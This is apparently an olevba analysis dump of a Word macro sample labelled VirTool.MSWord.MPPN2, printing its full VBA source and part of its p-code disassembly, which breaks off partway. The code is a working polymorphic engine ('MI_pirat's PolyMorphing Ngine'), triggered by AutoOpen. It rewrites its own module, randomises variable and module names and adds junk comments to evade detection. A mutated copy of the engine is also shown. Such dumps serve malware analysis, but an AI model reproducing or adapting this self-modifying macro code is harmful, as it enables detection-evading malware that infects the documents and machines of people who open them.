olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.MPPN2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KGB.bas 
in file: VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/KGB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen2()
'KGB ';`,!
On Error Resume Next 'tyH!
If ThisDocument.Name <> NormalTemplate.Name Then '„7X!
TRTM1 = 12 '�x!
ReDim LUWM1(1 To TRTM1) As String ''*’!
LUWM1(1) = "TRTM1": LUWM1(2) = "KSIM1": LUWM1(3) = "AUUM1" '>e+!
LUWM1(4) = "LUWM1": LUWM1(5) = "MWCM1": LUWM1(6) = "YNCM1": LUWM1(7) = "GSYM1" '^)„!
LUWM1(8) = "PUDM1": LUWM1(9) = "DYRM1": LUWM1(10) = "OUPM1": LUWM1(11) = "GRDM1"
LUWM1(12) = "PDBM1" 'UM’!
KSIM1 = ActiveDocument.Content '%`8!
For GSYM1 = 1 To ActiveDocument.VBProject.VBComponents.Count 'I-‹!
OUPM1 = ActiveDocument.VBProject.VBComponents(GSYM1).CodeModule.Lines(2, 1) ']5H!
PUDM1 = Mid(OUPM1, 1, 1) 'E8`!
DYRM1 = Len(OUPM1) '6?2!
If DYRM1 >= 4 Then GRDM1 = Mid(OUPM1, 2, 3) '\e}!
If (PUDM1 = "'") And (GRDM1 = ActiveDocument.VBProject.VBComponents(GSYM1).Name) Then '`ˆN!
Randomize '„ˆf!
GRDM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(GSYM1).CodeModule.ReplaceLine 2, "'" + GRDM1
ActiveDocument.VBProject.VBComponents(GSYM1).Name = GRDM1 'pm7!
PDBM1 = GSYM1 'b/O!
End If '‚E>!
Next GSYM1 '+}^!
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize '0A�!
ActiveDocument.Content = "" '—ŽI!
AUUM1 = ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.CountOfLines '6:l!
For GSYM1 = 1 To AUUM1 'wo[!
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.Lines(GSYM1, 1)
Next GSYM1 '$VW!
For GSYM1 = 1 To TRTM1 'K„+!
Randomize 'sXJ!
YNCM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set MWCM1 = ActiveDocument.Content '@D`!
MWCM1.Find.Execute FindText:=LUWM1(GSYM1), ReplaceWith:=YNCM1, Replace:=wdReplaceAll
Next GSYM1 'z]W!
AUUM1 = ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.CountOfLines '>q3!
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.DeleteLines 1, AUUM1 'I02!
YNCM1 = ActiveDocument.Content 'f~‚!
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.AddFromString YNCM1 'A�!
ActiveDocument.Content = "" '‰0b!
ActiveDocument.Content = KSIM1 'm^ˆ!
mm: 'ˆRz!
If ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.DeleteLines 1, 1 'w|\!
GoTo mm 'kmd!
End If 'F: !
TRTM1 = ActiveDocument.VBProject.VBComponents.Item(PDBM1).CodeModule.CountOfLines
For GSYM1 = 2 To TRTM1 '*6`!
OUPM1 = ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.Lines(GSYM1, 1) 'q3s!
GRDM1 = Mid(OUPM1, Len(OUPM1)) '&E“!
If (GRDM1 <> "!") And (Len(OUPM1) < 80) Then 'hi+!
PUDM1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
YNCM1 = OUPM1 + " '" + PUDM1 + "!" '?MŠ!
ActiveDocument.VBProject.VBComponents.Item(PDBM1).CodeModule.ReplaceLine GSYM1, YNCM1
End If 'r\„!
Next GSYM1 ':†}!
ActiveDocument.VBProject.VBComponents(PDBM1).CodeModule.DeleteLines TRTM1, 1 '”2B!
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize 'B�‚!
End If '#:!
End Sub 'r?)!
-------------------------------------------------------------------------------
VBA MACRO Gen0.bas 
in file: VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/Gen0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PolyNgine()
'Gen0
'MI_pirat's PolyMorphing Ngine
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
nr = 12
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "nuk"
suk(4) = "suk": suk(5) = "myRange": suk(6) = "strip": suk(7) = "ik"
suk(8) = "char1": suk(9) = "nur": suk(10) = "nam1": suk(11) = "nam2"
suk(12) = "kewl"
bkup = ActiveDocument.Content
'find and change the module name (100% poly)
For ik = 1 To ActiveDocument.VBProject.VBComponents.Count
nam1 = ActiveDocument.VBProject.VBComponents(ik).CodeModule.Lines(2, 1)
char1 = Mid(nam1, 1, 1)
nur = Len(nam1)
If nur >= 4 Then nam2 = Mid(nam1, 2, 3)
If (char1 = "'") And (nam2 = ActiveDocument.VBProject.VBComponents(ik).Name) Then
Randomize
nam2 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(ik).CodeModule.ReplaceLine 2, "'" + nam2
ActiveDocument.VBProject.VBComponents(ik).Name = nam2
kewl = ik
End If
Next ik
'copy this code to the doc
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
ActiveDocument.Content = ""
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
'copy this source into the doc (so I can modify it)
For ik = 1 To nuk
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
Next ik
'now find the vars and poymorph 'em !
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:=suk(ik), ReplaceWith:=strip, Replace:=wdReplaceAll
Next ik
'copy everythig back to its origin
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, nuk
strip = ActiveDocument.Content
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.AddFromString strip
ActiveDocument.Content = ""
ActiveDocument.Content = bkup
mm:
If ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, 1
GoTo mm
End If
'Add random chars
nr = ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.CountOfLines
For ik = 2 To nr
nam1 = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
nam2 = Mid(nam1, Len(nam1))
If (nam2 <> "!") And (Len(nam1) < 80) Then
char1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strip = nam1 + " '" + char1 + "!"
ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.ReplaceLine ik, strip
End If
Next ik
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines nr, 1
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Form1.frm 
in file: VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Label4.Visible = True
End Sub

Private Sub CommandButton2_Click()
Form1.Hide
Form1.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Start.bas 
in file: VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/Start'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Form1.Enabled = True
Form1.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.MPPN2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6279 bytes
' Macros/VBA/KGB - 16904 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen2())
' Line #1:
' 	QuoteRem 0x0000 0x0009 "KGB ';`,!"
' Line #2:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0004 "tyH!"
' Line #3:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x0031 0x0004 "„7X!"
' Line #4:
' 	LitDI2 0x000C 
' 	St TRTM1 
' 	QuoteRem 0x000B 0x0004 "�x!"
' Line #5:
' 	LitDI2 0x0001 
' 	Ld TRTM1 
' 	RedimAs LUWM1 0x0001 (As String)
' 	QuoteRem 0x0022 0x0004 "'*’!"
' Line #6:
' 	LitStr 0x0005 "TRTM1"
' 	LitDI2 0x0001 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "KSIM1"
' 	LitDI2 0x0002 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "AUUM1"
' 	LitDI2 0x0003 
' 	ArgsSt LUWM1 0x0001 
' 	QuoteRem 0x003B 0x0004 ">e+!"
' Line #7:
' 	LitStr 0x0005 "LUWM1"
' 	LitDI2 0x0004 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "MWCM1"
' 	LitDI2 0x0005 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "YNCM1"
' 	LitDI2 0x0006 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "GSYM1"
' 	LitDI2 0x0007 
' 	ArgsSt LUWM1 0x0001 
' 	QuoteRem 0x004F 0x0004 "^)„!"
' Line #8:
' 	LitStr 0x0005 "PUDM1"
' 	LitDI2 0x0008 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "DYRM1"
' 	LitDI2 0x0009 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "OUPM1"
' 	LitDI2 0x000A 
' 	ArgsSt LUWM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "GRDM1"
' 	LitDI2 0x000B 
' 	ArgsSt LUWM1 0x0001 
' Line #9:
' 	LitStr 0x0005 "PDBM1"
' 	LitDI2 0x000C 
' 	ArgsSt LUWM1 0x0001 
' 	QuoteRem 0x0014 0x0004 "UM’!"
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	St KSIM1 
' 	QuoteRem 0x001F 0x0004 "%`8!"
' Line #11:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x003D 0x0004 "I-‹!"
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld GSYM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OUPM1 
' 	QuoteRem 0x004C 0x0004 "]5H!"
' Line #13:
' 	Ld OUPM1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St PUDM1 
' 	QuoteRem 0x0019 0x0004 "E8`!"
' Line #14:
' 	Ld OUPM1 
' 	FnLen 
' 	St DYRM1 
' 	QuoteRem 0x0013 0x0004 "6?2!"
' Line #15:
' 	Ld DYRM1 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld OUPM1 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St GRDM1 
' 	EndIf 
' 	QuoteRem 0x002C 0x0004 "\e}!"
' Line #16:
' 	Ld PUDM1 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld GRDM1 
' 	Ld GSYM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0056 0x0004 "`ˆN!"
' Line #17:
' 	ArgsCall Read 0x0000 
' 	QuoteRem 0x000A 0x0004 "„ˆf!"
' Line #18:
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St GRDM1 
' Line #19:
' 	LitDI2 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld GRDM1 
' 	Add 
' 	Ld GSYM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #20:
' 	Ld GRDM1 
' 	Ld GSYM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' 	QuoteRem 0x003A 0x0004 "pm7!"
' Line #21:
' 	Ld GSYM1 
' 	St PDBM1 
' 	QuoteRem 0x000E 0x0004 "b/O!"
' Line #22:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "‚E>!"
' Line #23:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 "+}^!"
' Line #24:
' 	Ld wdWindowStateMinimize 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt WindowState 
' 	QuoteRem 0x003E 0x0004 "0A�!"
' Line #25:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt Content 
' 	QuoteRem 0x001C 0x0004 "—ŽI!"
' Line #26:
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AUUM1 
' 	QuoteRem 0x004D 0x0004 "6:l!"
' Line #27:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AUUM1 
' 	For 
' 	QuoteRem 0x0017 0x0004 "wo[!"
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Ld GSYM1 
' 	LitDI2 0x0001 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld ActiveDocument 
' 	MemSt Content 
' Line #29:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 "$VW!"
' Line #30:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TRTM1 
' 	For 
' 	QuoteRem 0x0017 0x0004 "K„+!"
' Line #31:
' 	ArgsCall Read 0x0000 
' 	QuoteRem 0x000A 0x0004 "sXJ!"
' Line #32:
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "M1"
' 	Add 
' 	St YNCM1 
' Line #33:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Set MWCM1 
' 	QuoteRem 0x0023 0x0004 "@D`!"
' Line #34:
' 	Ld GSYM1 
' 	ArgsLd LUWM1 0x0001 
' 	ParamNamed FindText 
' 	Ld YNCM1 
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld MWCM1 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0003 
' Line #35:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 "z]W!"
' Line #36:
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AUUM1 
' 	QuoteRem 0x004D 0x0004 ">q3!"
' Line #37:
' 	LitDI2 0x0001 
' 	Ld AUUM1 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x004D 0x0004 "I02!"
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	St YNCM1 
' 	QuoteRem 0x001F 0x0004 "f~‚!"
' Line #39:
' 	Ld YNCM1 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	QuoteRem 0x004C 0x0004 "A�!"
' Line #40:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt Content 
' 	QuoteRem 0x001C 0x0004 "‰0b!"
' Line #41:
' 	Ld KSIM1 
' 	Ld ActiveDocument 
' 	MemSt Content 
' 	QuoteRem 0x001F 0x0004 "m^ˆ!"
' Line #42:
' 	Label mm 
' 	QuoteRem 0x0004 0x0004 "ˆRz!"
' Line #43:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x0049 0x0004 "w|\!"
' Line #45:
' 	GoTo mm 
' 	QuoteRem 0x0008 0x0004 "kmd!"
' Line #46:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "F: !"
' Line #47:
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St TRTM1 
' Line #48:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld TRTM1 
' 	For 
' 	QuoteRem 0x0017 0x0004 "*6`!"
' Line #49:
' 	Ld GSYM1 
' 	LitDI2 0x0001 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OUPM1 
' 	QuoteRem 0x0050 0x0004 "q3s!"
' Line #50:
' 	Ld OUPM1 
' 	Ld OUPM1 
' 	FnLen 
' 	ArgsLd Mid$ 0x0002 
' 	St GRDM1 
' 	QuoteRem 0x001F 0x0004 "&E“!"
' Line #51:
' 	Ld GRDM1 
' 	LitStr 0x0001 "!"
' 	Ne 
' 	Paren 
' 	Ld OUPM1 
' 	FnLen 
' 	LitDI2 0x0050 
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x002D 0x0004 "hi+!"
' Line #52:
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St PUDM1 
' Line #53:
' 	Ld OUPM1 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld PUDM1 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	St YNCM1 
' 	QuoteRem 0x0023 0x0004 "?MŠ!"
' Line #54:
' 	Ld GSYM1 
' 	Ld YNCM1 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #55:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "r\„!"
' Line #56:
' 	StartForVariable 
' 	Ld GSYM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 ":†}!"
' Line #57:
' 	Ld TRTM1 
' 	LitDI2 0x0001 
' 	Ld PDBM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x004D 0x0004 "”2B!"
' Line #58:
' 	Ld wdWindowStateMaximize 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt WindowState 
' 	QuoteRem 0x003E 0x0004 "B�‚!"
' Line #59:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "#:!"
' Line #60:
' 	EndSub 
' 	QuoteRem 0x0008 0x0004 "r?)!"
' Macros/VBA/Gen0 - 9433 bytes
' Line #0:
' 	FuncDefn (Sub PolyNgine())
' Line #1:
' 	QuoteRem 0x0000 0x0004 "Gen0"
' Line #2:
' 	QuoteRem 0x0000 0x001D "MI_pirat's PolyMorphing Ngine"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x000C 
' 	St nr 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld nr 
' 	RedimAs suk 0x0001 (As String)
' Line #7:
' 	LitStr 0x0002 "nr"
' 	LitDI2 0x0001 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "bkup"
' 	LitDI2 0x0002 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "nuk"
' 	LitDI2 0x0003 
' 	ArgsSt suk 0x0001 
' Line #8:
' 	LitStr 0x0003 "suk"
' 	LitDI2 0x0004 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "myRange"
' 	LitDI2 0x0005 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "strip"
' 	LitDI2 0x0006 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "ik"
' 	LitDI2 0x0007 
' 	ArgsSt suk 0x0001 
' Line #9:
' 	LitStr 0x0005 "char1"
' 	LitDI2 0x0008 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "nur"
' 	LitDI2 0x0009 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "nam1"
' 	LitDI2 0x000A 
' 	ArgsSt suk 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "nam2"
' 	LitDI2 0x000B 
' 	ArgsSt suk 0x0001 
' Line #10:
' 	LitStr 0x0004 "kewl"
' 	LitDI2 0x000C 
' 	ArgsSt suk 0x0001 
' Line #11:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	St bkup 
' Line #12:
' 	QuoteRem 0x0000 0x002B "find and change the module name (100% poly)"
' Line #13:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ik 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St nam1 
' Line #15:
' 	Ld nam1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St char1 
' Line #16:
' 	Ld nam1 
' 	FnLen 
' 	St nur 
' Line #17:
' 	Ld nur 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld nam1 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St nam2 
' 	EndIf 
' Line #18:
' 	Ld char1 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld nam2 
' 	Ld ik 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #19:
' 	ArgsCall Read 0x0000 
' Line #20:
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St nam2 
' Line #21:
' 	LitDI2 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld nam2 
' 	Add 
' 	Ld ik 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #22:
' 	Ld nam2 
' 	Ld ik 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #23:
' 	Ld ik 
' 	St kewl 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	QuoteRem 0x0000 0x0019 "copy this code to the doc"
' Line #27:
' 	Ld wdWindowStateMinimize 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt WindowState 
' Line #28:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt Content 
' Line #29:
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nuk 
' Line #30:
' 	QuoteRem 0x0000 0x0032 "copy this source into the doc (so I can modify it)"
' Line #31:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	For 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Ld ik 
' 	LitDI2 0x0001 
